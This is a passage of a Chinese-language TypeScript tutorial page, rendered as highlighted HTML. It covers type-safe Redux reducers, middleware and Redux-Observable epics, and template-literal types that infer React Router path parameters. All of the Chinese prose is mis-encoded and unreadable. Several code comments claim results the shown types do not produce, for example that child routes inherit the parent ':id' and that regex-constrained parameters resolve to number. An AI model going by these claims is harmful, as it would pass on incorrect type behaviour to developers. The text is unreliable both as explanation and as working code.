class="hljs-params">state, action</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> newState = &#123;&#125; <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> reducers) &#123;<br>      newState[key] = reducers[key](state?.[key], action);<br>    &#125;<br>    <span class="hljs-keyword">return</span> newState;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¾¹ç•Œå¤„ç†ä¸ä¼˜åŒ–</strong></p><table><thead><tr><th align="left">è¾¹ç•Œæƒ…å†µ</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">ç©º action å¤„ç†</td><td align="left">ä½¿ç”¨ never ç±»å‹è¿›è¡Œç©·å°½æ£€æŸ¥</td></tr><tr><td align="left">åµŒå¥—çŠ¶æ€æ›´æ–°</td><td align="left">ä½¿ç”¨ Immer åº“è¿›è¡Œå¯å˜å†™æ³•</td></tr><tr><td align="left">å†å²çŠ¶æ€ç±»å‹</td><td align="left">æ·»åŠ  undoable reducer ç±»å‹æ‰©å±•</td></tr><tr><td align="left">åŠ¨æ€ reducer æ³¨å†Œ</td><td align="left">ç±»å‹å®‰å…¨çš„ injectReducer æ¨¡å¼</td></tr></tbody></table><p>æ€§èƒ½ä¼˜åŒ–ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 1. é¿å…æ·±å±‚åµŒå¥—çŠ¶æ€</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">State</span> = &#123;<br>  <span class="hljs-comment">// âŒ é¿å…</span><br>  <span class="hljs-attr">deep</span>: &#123; <span class="hljs-attr">a</span>: &#123; <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-built_in">number</span> &#125; &#125; &#125;;<br>  <span class="hljs-comment">// âœ… æ¨è</span><br>  <span class="hljs-attr">flat</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">FlatItem</span>&gt;;<br>&#125;;<br><br><span class="hljs-comment">// 2. ä½¿ç”¨ Reselect è®°å¿†åŒ–é€‰æ‹©å™¨</span><br><span class="hljs-keyword">import</span> &#123; createSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;reselect&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">selectTodos</span> = (<span class="hljs-params"><span class="hljs-attr">state</span>: <span class="hljs-title class_">State</span></span>) =&gt; state.<span class="hljs-property">todos</span>;<br><span class="hljs-keyword">const</span> selectCompletedTodos = <span class="hljs-title function_">createSelector</span>(<br>  [selectTodos],<br>  <span class="hljs-function"><span class="hljs-params">todos</span> =&gt;</span> todos.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">completed</span>)<br>);<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•çº§è€ƒç‚¹</strong></p><ol><li>ç±»å‹æ”¶çª„åŸç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åˆ©ç”¨å¯è¾¨è¯†è”åˆï¼ˆdiscriminated unionï¼‰</span><br><span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;INCREMENT&#x27;</span>) &#123;<br>  <span class="hljs-comment">// æ­¤å¤„ action è‡ªåŠ¨æ”¶çª„ä¸º &#123; type: &#x27;INCREMENT&#x27;; payload: number &#125;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹å®‰å…¨ä¸æ€§èƒ½å¹³è¡¡ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// âŒ è¿‡åº¦æ³›åŒ–</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Action</span>&lt;T = <span class="hljs-built_in">any</span>&gt; = &#123; <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">payload</span>: T &#125;;<br><br><span class="hljs-comment">// âœ… ç²¾ç¡®æ§åˆ¶</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">StrictAction</span> = &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;A&#x27;</span>; <span class="hljs-attr">payload</span>: <span class="hljs-built_in">number</span> &#125; | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;B&#x27;</span>; <span class="hljs-attr">payload</span>: <span class="hljs-built_in">string</span> &#125;;<br></code></pre></td></tr></table></figure><ol start="3"><li>Redux ä¸­é—´ä»¶ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MiddlewareAPI</span>&lt;D <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Dispatch</span>, S&gt; &#123;<br>  <span class="hljs-attr">dispatch</span>: D;<br>  <span class="hljs-title function_">getState</span>(): S;<br>&#125;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Middleware</span> = &lt;S&gt;<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">api</span>: <span class="hljs-title class_">MiddlewareAPI</span>&lt;<span class="hljs-title class_">Dispatch</span>, S&gt;</span>) =&gt;</span> <br>  <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">next</span>: <span class="hljs-title class_">Dispatch</span></span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">action</span>: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">any</span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>æ—¶é—´æ—…è¡Œè°ƒè¯•ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">TimeTravelState</span> = &#123;<br>  <span class="hljs-attr">past</span>: <span class="hljs-title class_">State</span>[];<br>  <span class="hljs-attr">present</span>: <span class="hljs-title class_">State</span>;<br>  <span class="hljs-attr">future</span>: <span class="hljs-title class_">State</span>[];<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="5"><li>ç»ˆææŒ‘æˆ˜ï¼šå®ç°ç±»å‹å®‰å…¨çš„ Redux-Observable</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Epic</span> = <span class="hljs-function">(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-attr">action$</span>: <span class="hljs-title class_">Observable</span>&lt;<span class="hljs-title class_">Action</span>&gt;,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-attr">state$</span>: <span class="hljs-title class_">StateObservable</span>&lt;<span class="hljs-title class_">State</span>&gt;</span></span><br><span class="hljs-params"><span class="hljs-function"></span>) =&gt;</span> <span class="hljs-title class_">Observable</span>&lt;<span class="hljs-title class_">Action</span>&gt;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">fetchEpic</span>: <span class="hljs-title class_">Epic</span> = <span class="hljs-function">(<span class="hljs-params">action$, state$</span>) =&gt;</span> <br>  action$.<span class="hljs-title function_">pipe</span>(<br>    <span class="hljs-title function_">ofType</span>(<span class="hljs-string">&#x27;FETCH_REQUEST&#x27;</span>),<br>    <span class="hljs-title function_">switchMap</span>(<span class="hljs-function"><span class="hljs-params">action</span> =&gt;</span> <br>      <span class="hljs-title function_">from</span>(api.<span class="hljs-title function_">fetchData</span>(action.<span class="hljs-property">payload</span>)).<span class="hljs-title function_">pipe</span>(<br>        <span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: response &#125;)),<br>        <span class="hljs-title function_">catchError</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-title function_">of</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_ERROR&#x27;</span>, <span class="hljs-attr">payload</span>: error &#125;))<br>    )<br>  );<br></code></pre></td></tr></table></figure><h3 id="2-2-4-è·¯ç”±å‚æ•°è‡ªåŠ¨ç±»å‹æ¨å¯¼"><a href="#2-2-4-è·¯ç”±å‚æ•°è‡ªåŠ¨ç±»å‹æ¨å¯¼" class="headerlink" title="2.2.4 è·¯ç”±å‚æ•°è‡ªåŠ¨ç±»å‹æ¨å¯¼"></a>2.2.4 è·¯ç”±å‚æ•°è‡ªåŠ¨ç±»å‹æ¨å¯¼</h3><p><strong>æ ¸å¿ƒæŒ‘æˆ˜</strong></p><ol><li>è·¯å¾„è§£æï¼šå°†å­—ç¬¦ä¸²è·¯å¾„ï¼ˆå¦‚ &#x2F;user&#x2F;:id&#x2F;posts&#x2F;:postIdï¼‰è½¬æ¢ä¸ºç±»å‹ç»“æ„</li><li>å‚æ•°æå–ï¼šè¯†åˆ«åŠ¨æ€æ®µï¼ˆ:paramï¼‰å’Œå¯é€‰æ®µï¼ˆ?ï¼‰</li><li>ç±»å‹è½¬æ¢ï¼šå°†å‚æ•°åæ˜ å°„ä¸ºå¯¹è±¡é”®ï¼ˆ{ id: string; postId: string }ï¼‰</li><li>åµŒå¥—è·¯ç”±ï¼šæ”¯æŒå¤šå±‚è·¯ç”±å‚æ•°åˆå¹¶</li></ol><p><strong>åŸºç¡€è·¯å¾„å‚æ•°æ¨å¯¼</strong></p><p>åœºæ™¯1ï¼šæå–å•ä¸€è·¯å¾„å‚æ•°</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Path</span>&gt; = <br>  <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>/<span class="hljs-subst">$&#123;infer Rest&#125;</span>`</span><br>    ? <span class="hljs-title class_">Param</span> | <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Rest</span>&gt;<br>    : <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>`</span><br>      ? <span class="hljs-title class_">Param</span><br>      : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test1</span> = <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-string">&#x27;/user/:id&#x27;</span>&gt;;  <span class="hljs-comment">// &quot;id&quot;</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test2</span> = <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-string">&#x27;/post/:postId/comment/:commentId&#x27;</span>&gt;;  <span class="hljs-comment">// &quot;postId&quot; | &quot;commentId&quot;</span><br></code></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šè½¬æ¢ä¸ºå‚æ•°å¯¹è±¡ç±»å‹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-title class_">Path</span>&gt; = &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Path</span>&gt;]: <span class="hljs-built_in">string</span>;<br>&#125;;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params1</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-string">&#x27;/user/:id&#x27;</span>&gt;;  <span class="hljs-comment">// &#123; id: string &#125;</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params2</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-string">&#x27;/category/:categoryId/product/:productId&#x27;</span>&gt;; <br><span class="hljs-comment">// &#123; categoryId: string; productId: string &#125;</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§è·¯ç”±ç‰¹æ€§å®ç°</strong></p><p>ç‰¹æ€§1ï¼šå¯é€‰å‚æ•°ï¼ˆ?ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractOptionalParam</span>&lt;<span class="hljs-title class_">Path</span>&gt; =<br>  <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>?/<span class="hljs-subst">$&#123;infer Rest&#125;</span>`</span><br>    ? <span class="hljs-title class_">Param</span> | <span class="hljs-title class_">ExtractOptionalParam</span>&lt;<span class="hljs-title class_">Rest</span>&gt;<br>    : <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>?`</span><br>      ? <span class="hljs-title class_">Param</span><br>      : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-title class_">Path</span>&gt; = &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Path</span>&gt;]: <span class="hljs-built_in">string</span>;<br>&#125; &amp; &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractOptionalParam</span>&lt;<span class="hljs-title class_">Path</span>&gt;]?: <span class="hljs-built_in">string</span>;<br>&#125;;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params3</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-string">&#x27;/search/:query?&#x27;</span>&gt;;  <span class="hljs-comment">// &#123; query?: string &#125;</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params4</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-string">&#x27;/user/:id/profile/:tab?&#x27;</span>&gt;; <br><span class="hljs-comment">// &#123; id: string; tab?: string &#125;</span><br></code></pre></td></tr></table></figure><p>ç‰¹æ€§2ï¼šé€šé…ç¬¦åŒ¹é…ï¼ˆ*ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractWildcard</span>&lt;<span class="hljs-title class_">Path</span>&gt; =<br>  <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>*<span class="hljs-subst">$&#123;infer Rest&#125;</span>`</span><br>    ? <span class="hljs-string">&#x27;wildcard&#x27;</span> | <span class="hljs-title class_">ExtractWildcard</span>&lt;<span class="hljs-title class_">Rest</span>&gt;<br>    : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-title class_">Path</span>&gt; = &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Path</span>&gt;]: <span class="hljs-built_in">string</span>;<br>&#125; &amp; &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractOptionalParam</span>&lt;<span class="hljs-title class_">Path</span>&gt;]?: <span class="hljs-built_in">string</span>;<br>&#125; &amp; &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractWildcard</span>&lt;<span class="hljs-title class_">Path</span>&gt;]: <span class="hljs-built_in">string</span>[];<br>&#125;;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params5</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-string">&#x27;/files/*&#x27;</span>&gt;;  <span class="hljs-comment">// &#123; wildcard: string[] &#125;</span><br></code></pre></td></tr></table></figure><p>ç‰¹æ€§3ï¼šæ­£åˆ™çº¦æŸå‚æ•°</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractConstrainedParam</span>&lt;<span class="hljs-title class_">Path</span>&gt; =<br>  <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>(<span class="hljs-subst">$&#123;infer Regex&#125;</span>)/<span class="hljs-subst">$&#123;infer Rest&#125;</span>`</span><br>    ? &#123; <span class="hljs-attr">param</span>: <span class="hljs-title class_">Param</span>; <span class="hljs-attr">regex</span>: <span class="hljs-title class_">Regex</span> &#125; | <span class="hljs-title class_">ExtractConstrainedParam</span>&lt;<span class="hljs-title class_">Rest</span>&gt;<br>    : <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>(<span class="hljs-subst">$&#123;infer Regex&#125;</span>)`</span><br>      ? &#123; <span class="hljs-attr">param</span>: <span class="hljs-title class_">Param</span>; <span class="hljs-attr">regex</span>: <span class="hljs-title class_">Regex</span> &#125;<br>      : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MapRegexToType</span>&lt;R&gt; = <br>  R <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;\\d+&#x27;</span> ? <span class="hljs-built_in">number</span> :<br>  R <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;\\w+&#x27;</span> ? <span class="hljs-built_in">string</span> :<br>  <span class="hljs-built_in">string</span>;  <span class="hljs-comment">// é»˜è®¤å›é€€</span><br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-title class_">Path</span>&gt; = &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Path</span>&gt;]: <span class="hljs-built_in">string</span>;<br>&#125; &amp; &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractOptionalParam</span>&lt;<span class="hljs-title class_">Path</span>&gt;]?: <span class="hljs-built_in">string</span>;<br>&#125; &amp; &#123;<br>  [K <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractWildcard</span>&lt;<span class="hljs-title class_">Path</span>&gt;]: <span class="hljs-built_in">string</span>[];<br>&#125; &amp; &#123;<br>  [P <span class="hljs-keyword">in</span> <span class="hljs-title class_">ExtractConstrainedParam</span>&lt;<span class="hljs-title class_">Path</span>&gt; <span class="hljs-keyword">as</span> P[<span class="hljs-string">&#x27;param&#x27;</span>]]: <br>    <span class="hljs-title class_">MapRegexToType</span>&lt;P[<span class="hljs-string">&#x27;regex&#x27;</span>]&gt;;<br>&#125;;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params6</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-string">&#x27;/user/:id(\\d+)&#x27;</span>&gt;;  <span class="hljs-comment">// &#123; id: number &#125;</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Params7</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-string">&#x27;/post/:slug(\\w+)&#x27;</span>&gt;; <span class="hljs-comment">// &#123; slug: string &#125;</span><br></code></pre></td></tr></table></figure><p><strong>React Router é›†æˆå®è·µ</strong></p><p>ç±»å‹å®‰å…¨è·¯ç”±ç»„ä»¶ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; useParams &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºç±»å‹å®‰å…¨ç‰ˆæœ¬</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> useTypedParams&lt;<span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt;() &#123;<br>  <span class="hljs-keyword">type</span> <span class="hljs-title class_">Params</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-title class_">Path</span>&gt;;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useParams</span>() <span class="hljs-keyword">as</span> <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Params</span>&gt;; <span class="hljs-comment">// å¯èƒ½æœªåŒ¹é…æ‰€æœ‰å‚æ•°</span><br>&#125;<br><br><span class="hljs-comment">// åœ¨ç»„ä»¶ä¸­ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">UserProfile</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> params = useTypedParams&lt;<span class="hljs-string">&#x27;/user/:id/:tab?&#x27;</span>&gt;(); <br>  <span class="hljs-comment">// params: &#123; id?: string; tab?: string &#125;</span><br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>User ID: &#123;params.id || &#x27;Unknown&#x27;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç±»å‹å®‰å…¨è·¯ç”±é…ç½®ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">RouteConfig</span>&lt;<span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = &#123;<br>  <span class="hljs-attr">path</span>: <span class="hljs-title class_">Path</span>;<br>  <span class="hljs-attr">element</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;<br>  <span class="hljs-attr">children</span>?: <span class="hljs-title class_">RouteConfig</span>&lt;<span class="hljs-built_in">any</span>&gt;[];<br>&#125;;<br><br><span class="hljs-keyword">function</span> createRoute&lt;<span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt;(<span class="hljs-attr">config</span>: <span class="hljs-title class_">RouteConfig</span>&lt;<span class="hljs-title class_">Path</span>&gt;) &#123;<br>  <span class="hljs-keyword">return</span> config;<br>&#125;<br><br><span class="hljs-keyword">const</span> routes = <span class="hljs-title function_">createRoute</span>(&#123;<br>  <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/user/:id&#x27;</span>,<br>  <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserPage</span> /&gt;</span></span>,<br>  <span class="hljs-attr">children</span>: [<br>    &#123; <br>      <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;posts/:postId&#x27;</span>,  <span class="hljs-comment">// å®Œæ•´è·¯å¾„: /user/:id/posts/:postId</span><br>      <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PostPage</span> /&gt;</span></span><br>    &#125;<br>  ]<br>&#125;);<br><br><span class="hljs-comment">// è‡ªåŠ¨æ¨å¯¼å‚æ•°ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">UserPageParams</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-keyword">typeof</span> routes.<span class="hljs-property">path</span>&gt;;          <span class="hljs-comment">// &#123; id: string &#125;</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">PostPageParams</span> = <span class="hljs-title class_">PathParams</span>&lt;<span class="hljs-keyword">typeof</span> routes.<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">path</span>&gt;; <br><span class="hljs-comment">// &#123; id: string; postId: string &#125; (åŒ…å«çˆ¶çº§å‚æ•°)</span><br></code></pre></td></tr></table></figure><p><strong>è¾¹ç•Œå¤„ç†ä¸ä¼˜åŒ–</strong></p><p>é€’å½’æ·±åº¦æ§åˆ¶ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Path</span>, <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> = <span class="hljs-number">5</span>&gt; = <br>  <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-number">0</span> ? <span class="hljs-built_in">never</span> :<br>  <span class="hljs-title class_">Path</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span>/<span class="hljs-subst">$&#123;infer Rest&#125;</span>`</span><br>    ? <span class="hljs-title class_">Param</span> | <span class="hljs-title class_">ExtractParam</span>&lt;<span class="hljs-title class_">Rest</span>, <span class="hljs-title class_">Subtract</span>&lt;<span class="hljs-title class_">Depth</span>, <span 